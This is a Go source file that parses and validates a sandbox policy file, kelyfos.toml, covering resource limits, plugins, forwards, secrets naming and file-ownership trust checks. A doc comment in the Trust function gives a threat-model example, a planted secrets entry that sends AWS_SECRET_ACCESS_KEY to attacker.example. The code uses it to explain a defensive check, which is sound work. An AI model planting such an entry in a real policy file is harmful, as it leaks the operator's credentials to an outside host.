// Package config reads kelyfos.toml: the sandbox policy a project commits
// alongside its code, the way it commits a .devcontainer.
//
// The point is that the policy travels with the project. Someone who clones a
// repository and runs `kelyfos run` gets the allowlist, the image and the
// resource limits its authors chose, without being told them.
//
// Secret *values* never appear here. The file names the secrets a project
// needs; the values come from the host environment, and a policy file committed
// to a repository must stay safe to commit.
package config

import (
	"fmt"
	"math"
	"os"
	"os/user"
	"path/filepath"
	"strconv"
	"strings"
	"time"
)

// FileName is the policy file a project commits.
const FileName = "kelyfos.toml"

// Config is a project's sandbox policy. Zero values mean "not set", so an
// explicit flag can always be told apart from a default.
type Config struct {
	Image     string
	Arch      string
	Allow     []string
	Secrets   []string
	Workspace string
	Vcpus     int
	MemMiB    int

	// [resources] — the caps the user declares for the machine (F-D10).
	// DiskBytes is the ceiling on the packed workspace image, not the rootfs.
	// Precedence stays v0.3 behaviour for now: an explicit flag wins. Turning
	// these into hard ceilings is E1-1's job, spec first.
	ResCPUs     int
	ResMemMiB   int
	ResDiskByte int64
	ResCPUQuota int // percent of one core's worth of CPU time

	// I/O rates, enforced by Firecracker's own token-bucket limiters (E1-3).
	// Rates are decimal — megabits and megabytes of a million — because that is
	// how a rate is quoted, whereas the sizes above are powers of two because
	// that is what a size means. docs/resources.md says so out loud.
	ResNetMbpsRx int
	ResNetMbpsTx int
	ResDiskIOPS  int
	ResDiskMbps  int

	// Scratch is the size of the tmpfs behind the overlay: everything the guest
	// writes outside /work (E1-5). Zero means the guest kernel's own default,
	// which is half the guest's RAM.
	ResScratchByte int64

	// [mcp] — the outward MCP server's own limits (E4-1). Zero means the
	// default; the parser refuses a non-positive value rather than accepting a
	// limit that permits nothing.
	MCPMaxSandboxes int

	// [[plugin]] — MCP servers that run inside the guest, one entry each
	// (E4-6, F-D6). Order is the order they were written, which is the order
	// they are packed and launched in.
	Plugins []Plugin

	// [[forward]] — host port to guest-local port, one entry each (E5-5,
	// F-D7). Order is the order they were written; each is a listener the host
	// binds once the sandbox is ready.
	Forwards []Forward

	// Time budgets (E1-6). Zero means no budget.
	ResMaxRuntime  time.Duration
	ResIdleTimeout time.Duration
	// ResLine records where each [resources] key was written, so a refusal can
	// name the line the ceiling came from instead of just the number.
	ResLine map[string]int

	// Notify asks for a desktop notification when a run wants a person back
	// (E5-7). Off unless written, here or as --notify.
	Notify bool

	// Team is the [team] section, when the file has one (E2-4). Nil means this
	// is an ordinary single-sandbox policy, which is most files.
	Team *Team

	// Sessions is the [sessions] section, when the file has one (P7-5, D61).
	// Nil means the file says nothing about retention, which gets the
	// built-in default rather than "no floor at all" — the same reason
	// Team being nil means "not a team" rather than "an empty one."
	Sessions *Sessions

	// Path is where this was read from, for error messages that say which file
	// is wrong.
	Path string
}

// Sessions is [sessions]: retention for the flight recorder's own history
// under ~/.cache/kelyfos/sessions/, which `kelyfos sessions prune` reads
// (P7-5, D61).
type Sessions struct {
	// RetentionDays is a floor, not a target: kelyfos sessions prune never
	// touches a session younger than this, however it is invoked. Zero
	// means "not set" and gets the built-in default (180 days) — the same
	// convention this file's own package doc states for every other
	// numeric field here, kept rather than switching to a pointer the way
	// internal/recorder does for its own JSON omitempty concern, which does
	// not apply to a TOML file this package only ever reads once.
	RetentionDays int
}

// Find walks up from a directory looking for a policy file, so running kelyfos
// from a subdirectory of a project behaves the way git does.
//
// Finding a file is not trusting it. Trust decides that, and every caller of
// this function has to ask it before Load — the walk is what makes a file
// somebody else left in a parent directory reachable at all (P7-17/F21).
func Find(start string) (string, bool) {
	dir, err := filepath.Abs(start)
	if err != nil {
		return "", false
	}
	for {
		candidate := filepath.Join(dir, FileName)
		if _, err := os.Stat(candidate); err == nil {
			return candidate, true
		}
		parent := filepath.Dir(dir)
		if parent == dir {
			return "", false
		}
		dir = parent
	}
}

// Load parses a policy file.
//
// The parser is deliberately small, and F-D16 records why it stayed that way
// when the team schema arrived: this file is *policy*, and for policy a parser
// a reader can audit in ten minutes is worth more than a general one nobody
// here will read. It understands a documented subset of TOML — sections, array
// of tables one level deep, scalars and string arrays — and anything else is an
// error naming the line, never a silent skip. A policy file with a typo that
// quietly does nothing is worse than one that refuses.
func Load(path string) (*Config, error) {
	blob, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	return parse(blob, path)
}

// parse is Load without the file read.
//
// Split out so a fuzz harness can drive the parser from bytes rather than
// writing a temporary file per input (P6-3). Nothing about the parsing moved:
// F-D16 argued for keeping this small and hand-rolled and that is unchanged —
// this only separates "get the bytes" from "understand them", which is also
// what lets the error messages keep naming the real path.
func parse(blob []byte, path string) (*Config, error) {
	var err error
	cfg := &Config{Path: path, ResLine: map[string]int{}}
	section := ""

	for n, raw := range strings.Split(string(blob), "\n") {
		line := strings.TrimSpace(stripComment(raw))
		if line == "" {
			continue
		}
		where := fmt.Sprintf("%s:%d", path, n+1)

		if strings.HasPrefix(line, "[") {
			var err error
			section, err = cfg.header(line, where)
			if err != nil {
				return nil, err
			}
			continue
		}
		key, value, ok := strings.Cut(line, "=")
		if !ok {
			return nil, fmt.Errorf("%s: expected key = value", where)
		}
		key = strings.TrimSpace(key)
		value = strings.TrimSpace(value)

		if section == "plugin" {
			if err := cfg.pluginKey(key, value, where); err != nil {
				return nil, err
			}
			continue
		}

		if section == "forward" {
			if err := cfg.forwardKey(key, value, where); err != nil {
				return nil, err
			}
			continue
		}

		if section == "sessions" {
			switch key {
			case "retention_days":
				cfg.Sessions.RetentionDays, err = parseCount(value, where, key)
			default:
				return nil, unknownKey(where, key, "sessions")
			}
			if err != nil {
				return nil, err
			}
			continue
		}

		if section == "mcp" {
			switch key {
			case "max_sandboxes":
				cfg.MCPMaxSandboxes, err = parseRate(value, where, key)
			default:
				return nil, unknownKey(where, key, "mcp")
			}
			if err != nil {
				return nil, err
			}
			continue
		}

		if strings.HasPrefix(section, "team") {
			if err := cfg.teamKey(section, key, value, where); err != nil {
				return nil, err
			}
			continue
		}

		// [resources] keys are kept separate from [sandbox] so a typo in one
		// section cannot silently satisfy the other.
		if section == "resources" {
			cfg.ResLine[key] = n + 1
			switch key {
			case "cpus":
				cfg.ResCPUs, err = parseCount(value, where, key)
			case "mem":
				cfg.ResMemMiB, err = parseMiB(value, where)
			case "disk":
				cfg.ResDiskByte, err = parseBytes(value, where)
			case "cpu_quota":
				cfg.ResCPUQuota, err = parsePercent(value, where)
			case "net_mbps_rx":
				cfg.ResNetMbpsRx, err = parseRate(value, where, key)
			case "net_mbps_tx":
				cfg.ResNetMbpsTx, err = parseRate(value, where, key)
			case "disk_iops":
				cfg.ResDiskIOPS, err = parseRate(value, where, key)
			case "disk_mbps":
				cfg.ResDiskMbps, err = parseRate(value, where, key)
			case "scratch":
				cfg.ResScratchByte, err = parseBytes(value, where)
			case "max_runtime":
				cfg.ResMaxRuntime, err = parseDuration(value, where, key)
			case "idle_timeout":
				cfg.ResIdleTimeout, err = parseDuration(value, where, key)
			default:
				return nil, unknownKey(where, key, "resources")
			}
			if err != nil {
				return nil, err
			}
			continue
		}

		switch key {
		case "image":
			cfg.Image, err = parseString(value, where)
		case "arch":
			cfg.Arch, err = parseString(value, where)
		case "workspace":
			cfg.Workspace, err = parseString(value, where)
		case "allow":
			cfg.Allow, err = parseArray(value, where)
		case "secrets":
			cfg.Secrets, err = parseArray(value, where)
		case "vcpus":
			cfg.Vcpus, err = parseInt(value, where)
		case "mem_mib":
			cfg.MemMiB, err = parseInt(value, where)
		case "notify":
			cfg.Notify, err = parseBool(value, where)
		default:
			return nil, unknownKey(where, key, "")
		}
		if err != nil {
			return nil, err
		}
	}
	return cfg, cfg.validate()
}

// validate catches the mistakes that would otherwise show up as a confusing
// runtime failure, and the one that would be a security problem.
func (c *Config) validate() error {
	for _, s := range c.Secrets {
		// A value here would be committed to a repository. Refuse loudly rather
		// than let someone discover it in their git history.
		if strings.Contains(s, "=") {
			return fmt.Errorf("%s: secrets must name an environment variable and a domain "+
				"(NAME@domain), never a value — %q looks like it contains one", c.Path, s)
		}
		if !strings.Contains(s, "@") {
			return fmt.Errorf("%s: secret %q must be NAME@domain", c.Path, s)
		}
	}
	if c.Vcpus < 0 || c.MemMiB < 0 {
		return fmt.Errorf("%s: vcpus and mem_mib must not be negative", c.Path)
	}
	return nil
}

func stripComment(s string) string {
	var out strings.Builder
	inQuote := false
	for _, r := range s {
		switch {
		case r == '"':
			inQuote = !inQuote
		case r == '#' && !inQuote:
			return out.String()
		}
		out.WriteRune(r)
	}
	return out.String()
}

// parseCount reads a whole-number ceiling and refuses a negative one.
//
// Every other ceiling in [resources] already refuses negatives — parseBytes
// says "size cannot be negative", parseRate says "must be positive" — and the
// deprecated `vcpus` spelling is checked too. `cpus` was the one that was not,
// so `cpus = -1` parsed cleanly and became the ceiling every flag is compared
// against. Zero stays legal because it is how the rest of the code spells
// "no ceiling set". Found by FuzzConfigParse (P6-3).
func parseCount(value, where, key string) (int, error) {
	n, err := parseInt(value, where)
	if err != nil {
		return 0, err
	}
	if n < 0 {
		return 0, fmt.Errorf("%s: %s cannot be negative", where, key)
	}
	return n, nil
}

func parseString(v, where string) (string, error) {
	if len(v) < 2 || !strings.HasPrefix(v, `"`) || !strings.HasSuffix(v, `"`) {
		return "", fmt.Errorf("%s: expected a quoted string, got %s", where, v)
	}
	return v[1 : len(v)-1], nil
}

func parseInt(v, where string) (int, error) {
	n, err := strconv.Atoi(v)
	if err != nil {
		return 0, fmt.Errorf("%s: expected a number, got %s", where, v)
	}
	return n, nil
}

func parseArray(v, where string) ([]string, error) {
	if !strings.HasPrefix(v, "[") || !strings.HasSuffix(v, "]") {
		return nil, fmt.Errorf("%s: expected an array like [\"a\", \"b\"], got %s", where, v)
	}
	inner := strings.TrimSpace(v[1 : len(v)-1])
	if inner == "" {
		return nil, nil
	}
	var out []string
	for _, part := range splitTopLevel(inner) {
		part = strings.TrimSpace(part)
		if part == "" {
			continue
		}
		s, err := parseString(part, where)
		if err != nil {
			return nil, err
		}
		out = append(out, s)
	}
	return out, nil
}

// splitTopLevel splits s on commas that fall outside a "..." string, so an
// element like "--y=a,b" survives intact instead of being torn in two before
// parseString ever sees it. It is a small state scan, not a regex: walk the
// bytes tracking whether the cursor is inside a quoted string, treating \"
// as an escaped quote that does not close it (matching how TOML escapes a
// quote), and only split on a comma seen outside quotes. A quote that is
// never closed just runs to the end of the element, same as before — the
// unterminated element then fails parseString's own quoting check with its
// existing error message. Found by the security review (F7): the previous
// strings.Split(inner, ",") ran before any quote-awareness existed, so a
// single comma inside a quoted array element broke the whole file.
func splitTopLevel(s string) []string {
	var out []string
	inQuotes := false
	start := 0
	for i := 0; i < len(s); i++ {
		switch s[i] {
		case '\\':
			if inQuotes && i+1 < len(s) {
				i++ // skip the escaped character, e.g. \" or \\
			}
		case '"':
			inQuotes = !inQuotes
		case ',':
			if !inQuotes {
				out = append(out, s[start:i])
				start = i + 1
			}
		}
	}
	out = append(out, s[start:])
	return out
}

// parseBytes reads a human size — 512M, 2G, or a bare byte count. Sizes in a
// policy file are read by people, and "2G" is what a person writes; requiring
// 2147483648 invites the typo that this parser exists to refuse.
func parseBytes(value, where string) (int64, error) {
	s, err := parseString(value, where)
	if err != nil {
		// Unquoted is fine too: disk = 2G reads better than disk = "2G".
		s = strings.Trim(value, `"'`)
	}
	s = strings.TrimSpace(s)
	if s == "" {
		return 0, fmt.Errorf("%s: empty size", where)
	}
	mult := int64(1)
	switch last := s[len(s)-1]; last {
	case 'K', 'k':
		mult, s = 1<<10, s[:len(s)-1]
	case 'M', 'm':
		mult, s = 1<<20, s[:len(s)-1]
	case 'G', 'g':
		mult, s = 1<<30, s[:len(s)-1]
	case 'T', 't':
		mult, s = 1<<40, s[:len(s)-1]
	}
	n, err := strconv.ParseInt(strings.TrimSpace(s), 10, 64)
	if err != nil {
		return 0, fmt.Errorf("%s: %q is not a size (want 512M, 2G, or a byte count)", where, value)
	}
	if n < 0 {
		return 0, fmt.Errorf("%s: size cannot be negative", where)
	}
	// The multiplication is where a plausible-looking size becomes a hostile
	// one: `mem = 8700000000G` parses as a positive number and then wraps int64
	// into a *negative* ceiling, which every flag is afterwards compared
	// against. The number itself was checked; the product was not. Found by
	// FuzzConfigParse (P6-3).
	if mult > 1 && n > math.MaxInt64/mult {
		return 0, fmt.Errorf("%s: %q is larger than this machine can express", where, value)
	}
	return n * mult, nil
}

// parseMiB is parseBytes rounded to whole MiB, which is the unit Firecracker's
// machine config speaks.
func parseMiB(value, where string) (int, error) {
	b, err := parseBytes(value, where)
	if err != nil {
		return 0, err
	}
	if b > 0 && b < 1<<20 {
		return 0, fmt.Errorf("%s: %q is under 1 MiB", where, value)
	}
	return int(b >> 20), nil
}

// ParseSize exposes the policy file's size grammar to the CLI, so --disk 2G and
// disk = "2G" cannot drift apart.
func ParseSize(v string) (int64, error) { return parseBytes(v, "--disk") }

// parseDuration reads a budget like "60s", "30m" or "2h". Go's own grammar,
// because it is the one this project already speaks everywhere else and
// inventing a second way to write half an hour helps nobody.
func parseDuration(value, where, key string) (time.Duration, error) {
	t := strings.TrimSpace(strings.Trim(value, `"'`))
	d, err := time.ParseDuration(t)
	if err != nil {
		return 0, fmt.Errorf("%s: %s %q is not a duration (want 60s, 30m, 2h)", where, key, value)
	}
	if d <= 0 {
		return 0, fmt.Errorf("%s: %s must be positive; remove the key to leave that budget off", where, key)
	}
	return d, nil
}

// ParseDuration exposes the same grammar to the --max-runtime and
// --idle-timeout flags, so a flag and the file it is checked against cannot
// disagree about what "30m" means.
func ParseDuration(v, flag string) (time.Duration, error) { return parseDuration(v, flag, flag) }

// parseRate reads a positive I/O rate. Zero is refused rather than read as
// either "no limit" or "no traffic": both readings are defensible, which is
// exactly why the file may not say it.
func parseRate(value, where, key string) (int, error) {
	n, err := parseInt(strings.TrimSpace(strings.Trim(value, `"'`)), where)
	if err != nil {
		return 0, fmt.Errorf("%s: %s must be a whole number, got %s", where, key, value)
	}
	if n <= 0 {
		return 0, fmt.Errorf("%s: %s must be positive; remove the key to leave that limit off", where, key)
	}
	return n, nil
}

// Ceiling reports a [resources] ceiling and where it was declared, for the
// error a flag gets when it asks for more than the policy allows.
func (c *Config) Ceiling(key string) (line int, ok bool) {
	if c == nil || c.ResLine == nil {
		return 0, false
	}
	line, ok = c.ResLine[key]
	return line, ok
}

// ParseMemMiB reads a memory size for the --mem flag. A bare number is MiB,
// which is what --mem meant in v0.3 and what every v0.3 command line still
// says; anything with a unit is a size. Changing the meaning of `--mem 512`
// would silently give a machine half a gigabyte less than a day earlier.
func ParseMemMiB(v string) (int, error) {
	t := strings.TrimSpace(strings.Trim(v, `"'`))
	if t == "" {
		return 0, fmt.Errorf("empty size")
	}
	if n, err := strconv.Atoi(t); err == nil {
		if n <= 0 {
			return 0, fmt.Errorf("memory must be positive")
		}
		return n, nil
	}
	return parseMiB(v, "--mem")
}

// parsePercent reads a cpu_quota like "150%". The unit is a share of one
// core's worth of CPU time, not a share of the cores the guest can see.
func parsePercent(value, where string) (int, error) {
	t := strings.TrimSpace(strings.Trim(value, `"'`))
	if !strings.HasSuffix(t, "%") {
		return 0, fmt.Errorf("%s: cpu_quota must be a percentage like \"150%%\", got %q", where, value)
	}
	n, err := strconv.Atoi(strings.TrimSpace(strings.TrimSuffix(t, "%")))
	if err != nil || n <= 0 {
		return 0, fmt.Errorf("%s: cpu_quota %q is not a positive percentage", where, value)
	}
	return n, nil
}

// ParsePercent exposes the same grammar to the --cpu-quota flag.
func ParsePercent(v string) (int, error) { return parsePercent(v, "--cpu-quota") }

// Trust decides whether a policy file may be believed at all (P7-17/F21).
//
// Find walks from the working directory to / and takes the first kelyfos.toml
// it meets. That file then names an absolute workspace — packed into the guest
// and, on shutdown, synced back over that host directory — an absolute
// plugin.path, packed read-only into the guest so its contents become readable
// inside the sandbox, an allow list, and
// secrets = ["AWS_SECRET_ACCESS_KEY@attacker.example"], which reads the
// operator's environment and attaches the value to requests to a domain the
// same file allows. Until this existed, a file another local user left at
// /tmp/kelyfos.toml got all of that on a plain `kelyfos run` beneath it, and a
// file anybody could write got it whether or not they had left it there.
//
// This is the shape git fixed with safe.directory and sudo fixed with the
// ownership rule on sudoers. Two conditions, both refusals rather than
// warnings, because a warning about a file that has already been read is a
// warning about something that already happened:
//
//   - The file must not be group- or world-writable. Applied to a file named
//     with --policy as well as to a discovered one: naming a file does not make
//     a file anybody can rewrite safe.
//   - A DISCOVERED file must be owned by the invoking user, or by root. Not
//     applied to --policy, because an operator who names a file has made the
//     decision this rule exists to ask for.
//
// A symlink is checked on both ends: a link the invoking user does not own
// points wherever its owner chooses, whatever the target's own mode says.
//
// A file that is not there is not an error here. The callers' own "no policy
// at all" and "--policy names nothing" paths already say the right thing, and
// two messages for one condition is worse than none.
func Trust(path string, discovered bool) error {
	if li, err := os.Lstat(path); err == nil && li.Mode()&os.ModeSymlink != 0 {
		if err := trustOwner(path, li, discovered, "the symlink at"); err != nil {
			return err
		}
	}
	fi, err := os.Stat(path)
	if err != nil {
		return nil
	}
	if why := writableByOthers(fi); why != "" {
		return fmt.Errorf("%s is mode %04o, so %s.\n"+
			"    This file decides which host directory is packed into the guest and synced back\n"+
			"    over, which host directories a plugin exposes to it, which domains it may reach,\n"+
			"    and which of your environment variables are attached to requests. A file somebody\n"+
			"    else can edit does not get to decide those.\n"+
			"    Fix it with: chmod go-w %s", path, fi.Mode().Perm(), why, path)
	}
	return trustOwner(path, fi, discovered, "")
}

// writableByOthers says why a mode lets somebody other than the file's owner
// rewrite it, or "" when it does not.
//
// World-writable is unconditional. Group-writable is not, and getting that
// wrong would have been worse than the finding: this project's own development
// VM runs umask 0002, so `cat > kelyfos.toml` produces mode 0664 — and refusing
// that would have refused every cookbook recipe and every acceptance script in
// the repository, on the machine they are run on.
//
// A umask of 002 is safe precisely because of the convention it presupposes:
// the user-private group, where every account's primary group has one member
// and is named after the account. Under that convention the group bit grants
// nobody anything the owner bit did not already grant, and refusing it would
// be refusing "writable by you". Where the file's group is NOT that private
// group it is a genuine widening — a shared `staff`, `users` or project group
// — and it is refused.
//
// The test for the private group is deliberately both halves — the gid must be
// the invoking user's primary gid AND the group's name must be the user's own
// name. A primary group of `staff` passes the first and fails the second, which
// is the case that matters.
func writableByOthers(fi os.FileInfo) string {
	m := fi.Mode().Perm()
	if m&0o002 != 0 {
		return "every user on this machine can rewrite it"
	}
	if m&0o020 == 0 {
		return ""
	}
	gid, ok := fileGID(fi)
	if !ok {
		return "its group can rewrite it, and this platform will not say which group that is"
	}
	if isPrivateGroup(gid) {
		return ""
	}
	name := strconv.Itoa(gid)
	if g, err := user.LookupGroupId(name); err == nil {
		name = g.Name
	}
	return "everyone in the group " + name + " can rewrite it"
}

// isPrivateGroup reports whether gid is the invoking user's own user-private
// group: their primary gid, named after them. Anything else is a group with
// other people in it, as far as this check is willing to assume.
func isPrivateGroup(gid int) bool {
	if gid != os.Getgid() {
		return false
	}
	u, err := user.Current()
	if err != nil {
		return false
	}
	g, err := user.LookupGroupId(u.Gid)
	if err != nil {
		return false
	}
	return g.Name == u.Username
}

// trustOwner is the uid half, shared by the symlink and the file it names.
func trustOwner(path string, fi os.FileInfo, discovered bool, what string) error {
	if !discovered {
		return nil
	}
	uid, ok := fileUID(fi)
	if !ok {
		// No ownership information at all. Fail closed: the whole point of
		// this check is that a policy file nobody vouched for does not get to
		// name host paths, and "the platform would not say" is not vouching.
		return fmt.Errorf("cannot tell who owns %s, so it is not trusted to name host paths.\n"+
			"    Name it explicitly with --policy if it is yours", path)
	}
	me := os.Getuid()
	if uid == me || uid == 0 {
		return nil
	}
	prefix := "the policy file"
	if what != "" {
		prefix = what
	}
	return fmt.Errorf("%s %s is owned by uid %d, and you are uid %d.\n"+
		"    kelyfos found it by walking up from this directory, and a file somebody else\n"+
		"    left in a parent directory does not get to name your host paths, your domains\n"+
		"    or your environment variables.\n"+
		"    Name it explicitly with --policy if you meant to use it", prefix, path, uid, me)
}
